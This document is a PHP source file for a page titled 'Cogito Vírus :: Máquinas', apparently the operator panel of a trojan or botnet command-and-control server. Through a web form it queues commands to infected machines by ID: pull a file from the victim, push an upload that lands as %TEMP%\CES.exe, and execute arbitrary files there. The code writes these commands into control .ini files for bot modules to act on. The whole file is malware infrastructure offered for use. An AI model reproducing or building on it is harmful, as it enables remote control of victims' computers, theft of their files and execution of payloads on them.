<?php
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 
// 4985793847582834.php / UserUtilities.php ~~
//    Arquivo responsável por gerenciar coisas simples como Download Execute e Upload File...
//    
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	error_reporting(0);
	session_start();
	
	include("../modules/extras/global.php");	// Dados globais.
	include("../config.php");					// Configurações.
	include("0923840923949455.php");			// Itens globais do site.
	
	// Verifica login...
	if (!isset($_SESSION["LNG"])) { die($errorPage); }
	
	// Configuração de link ( Download File Module )
	$IDY = 0; $ID1UploadedFileX = "../modules/userutilities/downflx/FLD/FileX.EXT";
	
	// Recebe dados
	if (isset($_POST["IDX"])) {
		$ID = $_POST["IDX"];
		
		if ($ID == 1) {
			// Download File
			// Seta comando em arquivo de controle...
			$UID = $_GET["UID"]; $IDY = 1;
			
			$buf = "[CTLCTR]\nUID=". $UID ."\nCMD=002349458\n";
			$es = fopen("../databases/CTLCentral.ini", "w"); 
			if ($es) { fwrite($es, $buf); fclose($es); }
			
			// Seta comando em arquivo de controle do módulo...
			$buf = "[CTL]\nFLX=". $_POST["dirmachine"] ."\n";
			$es = fopen("../modules/userutilities/downflx/CTL.ini", "w"); 
			if ($es) { fwrite($es, $buf); fclose($es); }
			
			echo "<html><script language=\"javascript\">alert('Aguarde alguns instantes...\\nAp\u00f3s isso fa\u00e7a download do arquivo no link exibido na p\u00e1gina... (BAIXAR ARQUIVO UPADO)');</script></html>";
		}
		
		if ($ID == 2) {
			// Upload File
			// Seta comando em arquivo de controle...
			$UID = $_GET["UID"];
			$buf = "[CTLCTR]\nUID=". $UID ."\nCMD=009201994\n";
			$es = fopen("../databases/CTLCentral.ini", "w"); 
			if ($es) { fwrite($es, $buf); fclose($es); }
			
			// Seta comando em arquivo de controle do módulo...
			$buf = "[CTL]\nIDX=1\n";
			$es = fopen("../modules/userutilities/upflx/CTL.ini", "w"); 
			if ($es) { fwrite($es, $buf); fclose($es); }
			
			if (isset($_FILES['filex']['name'])) {
				if ((!empty($_FILES["filex"])) && ($_FILES['uploaded_file']['error'] == 0)) {
					
					$filename = basename($_FILES['filex']['name']);
					$ext = substr($filename, strrpos($filename, '.') + 1);
					if ($ext != "php") {
					
						$Path = getcwd();
						
						for ($x=0; ; $x++) {
							if ($Path[$x] == '\\') {
								if ($Path[$x + 1] == 'h' ) {
									if ($Path[$x + 2] == 'o' ) {
										if ($Path[$x + 3] == 'm' ) {
											$Path[$x + 1] = 'm'; $Path[$x + 3] = 'd'; $Path[$x + 4] = 'u'; break;
										}
									}
								}
							}
						}
						
						$Path = $Path . "les/userutilities/upflx/UPL/838754938";
						
						$FileX = fopen($Path, "r");
						if ($FileX) {
							fclose($FileX); unlink($Path);
							move_uploaded_file($_FILES['filex']['tmp_name'], $Path); 
							
						} else {
							move_uploaded_file($_FILES['filex']['tmp_name'], $Path); 
						}
					}
				}
			}
			
			echo "<html><script language=\"javascript\">alert('Arquivo ser\\u00e1 upado na m\\u00e1quina em instantes...\\nDiret\\u00f3rio: %TEMP%\\\CES.exe');</script></html>";
		}
		
		if ($ID == 3) {
			// Execute File
			// Seta comando em arquivo de controle...
			$UID = $_GET["UID"];
			
			$buf = "[CTLCTR]\nUID=". $UID ."\nCMD=094909222\n";
			$es = fopen("../databases/CTLCentral.ini", "w"); 
			if ($es) { fwrite($es, $buf); fclose($es); }
			
			// Seta comando em arquivo de controle do módulo...
			$buf = "[CTL]\nFLX=". $_POST["fileexec"] ."\n";
			$es = fopen("../modules/userutilities/execfile/CTL.ini", "w"); 
			if ($es) { fwrite($es, $buf); fclose($es); }
			
			$FileSX = $_POST["fileexec"]; $FileSY = str_replace("\\", "\\\\", $FileSX);
			echo "<html><script language=\"javascript\">alert('O arquivo ". $FileSY ." ser\\u00e1 executado na m\\u00e1quina...');</script></html>";
		}
		
		if ($ID == 4) {
			// Execute File Temp\CES.exe
			$UID = $_GET["UID"];
			
			$buf = "[CTLCTR]\nUID=". $UID ."\nCMD=456456644\n";
			$es = fopen("../databases/CTLCentral.ini", "w"); 
			if ($es) { fwrite($es, $buf); fclose($es); }
			
			echo "<html><script language=\"javascript\">alert('O arquivo %TEMP%\\\CES.exe ser\\u00e1 executado na m\\u00e1quina...');</script></html>";
		}
	}
	
?>
<html><head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type" />
<title> Cogito V&iacute;rus :: M&aacute;quinas</title>
<link rel="shortcut icon" href="<?php echo $faviconGL; ?>" type="image/x-icon" />
<link href="../midia/SiteFL/style.css" rel="stylesheet" type="text/css" />

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js"></script>
<script type="text/javascript">
	function SendX ( IDX ) {
		if (IDX == 1) {
			if (document.form.dirmachine.value != "") {
				document.form.IDX.value = "1";
				document.form.submit();
			} else {
				alert('Digite o nome do arquivo!');
				document.form.dirmachine.focus();
			}
		}
		
		if (IDX == 2) {
			document.form.IDX.value = "2";
			document.form.submit();
		}
		
		if (IDX == 3) {
			if (document.form.fileexec.value != "") {
				document.form.IDX.value = "3";
				document.form.submit();
			} else {
				alert('Digite o nome do arquivo!');
				document.form.fileexec.focus();
			}
		}
		
		if (IDX == 4) {
			document.form.IDX.value = "4";
			document.form.submit();
		}
	}
	
	$('#upl').live('click', function(){
		$('#file').click();
	})
</script></head><body>
<form name="form" method="post" enctype="multipart/form-data">
<input type="hidden" name="IDX" value="0" />
<center><pre><font style="color: white;"><?php echo $TopoMenu; ?><!-- Exibe topo e menu -->
|                                                                                                                                 |
|      ,----------------------------------.    ,---------------------------------.    ,---------------------------------.         |
|      |          DOWNLOAD FILE           |    |           UPLOAD FILE           |    |           EXECUTE FILE          |         |
|      | Diretório  <input style="background-color: green; color: black; border: 0;" type="text" name="dirmachine" value="" size="23" maxlength="254" />   |    |                                 |    | Arquivo   <input style="background-color: green; color: black; border: 0;" type="text" name="fileexec" value="" size="23" maxlength="254" />   |         |
|      |                                  |    |                                 |    |                                 |         |
|      |    <?php 

if ($IDY == 1) {
	echo " [ <a href=\"". $ID1UploadedFileX ."\" >BAIXAR ARQUIVO UPADO</a> ] ";
} else {
	echo "    [ <a href=\"#\" onclick=\"Javascript: SendX(1);\" >BAIXAR ARQUIVO</a> ]    ";
}

?>    |    |    [ <a href="#" id="upl" >SELECT</a> ]     [ <a href="#" onclick="Javascript: SendX(2);" >UPLOAD</a> ]    |    | [ <a href="#" onclick="Javascript: SendX(3);" >EXECUTAR</a> ] [ <a href="#" onclick="Javascript: SendX(4);" >%TEMP%\CES.exe</a> ] |         |
|      '----------------------------------'    '---------------------------------'    '---------------------------------'         |
|                                                                                                                                 |
|                                                                                                                                 |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                                        <font style="color: green;">8888888888888888888888888888888888888888888888888</font>                                        |
|                <font style="color: green;">`88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888´</font>                |
|                  <font style="color: green;">`8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888´</font>                  |
|                    <font style="color: green;">`888888888888888888888888888888888888888888888888888888888888888888888888888888888888888´</font>                    |
|                      <font style="color: green;">`88888888888888888888888888888888888888888888888888888888888888888888888888888888888´</font>                      |
|                        <font style="color: green;">`8888888888888888888888888888888888888888888888888888888888888888888888888888888´</font>                        |
|                          <font style="color: green;">`888888888888888888888888888888888888888888888888888888888888888888888888888´</font>                          |
|                            <font style="color: green;">`88888888888888888888888888888888888888888888888888888888888888888888888´</font>                            |
|                              <font style="color: green;">`8888888888888888888888888888888888888888888888888888888888888888888´</font>                              |
|                                <font style="color: green;">`888888888888888888888888888888888888888888888888888888888888888´</font>                                |
|                                  <font style="color: green;">`88888888888888888888888888888888888888888888888888888888888´</font>                                  |
|                                    <font style="color: green;">`8888888888888888888888888888888888888888888888888888888´</font>                                    |
|                                      <font style="color: green;">`888888888888888888888888888888888888888888888888888´</font>                                      |
|                                        <font style="color: green;">`88888888888888888888888888888888888888888888888´</font>                                        |
|                                          <font style="color: green;">`8888888888888888888888888888888888888888888´</font>                                          |
|                                            <font style="color: green;">`888888888888888888888888888888888888888´</font>                                            |
|                                              <font style="color: green;">`88888888888888888888888888888888888´</font>                                              |
|                                                <font style="color: green;">`8888888888888888888888888888888´</font>                                                |
|                                                  <font style="color: green;">`888888888888888888888888888´</font>                                                  |
|                                                    <font style="color: green;">`88888888888889888888888´</font>                                                    |
|                                                      <font style="color: green;">`8888888888888888888´</font>                                                      |
|                                                        <font style="color: green;">`888888888888888´</font>                                                        |
|                                                          <font style="color: green;">`88888888888´</font>                                                          |
|                                                            <font style="color: green;">`8888888´</font>                                                            |
|                                                              <font style="color: green;">`888´</font>                                                              |
|                                                                <font style="color: green;">"</font>                                                                |
|                                                                                                                                 |<?php echo $RodapeCV; ?> <!-- Exibe rodapé -->
</font></pre>

</center>
<input class="filex" id="file" type="file" name="filex" />
</form>
</body></html>
<?php
// EOF  ~~ 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
?>
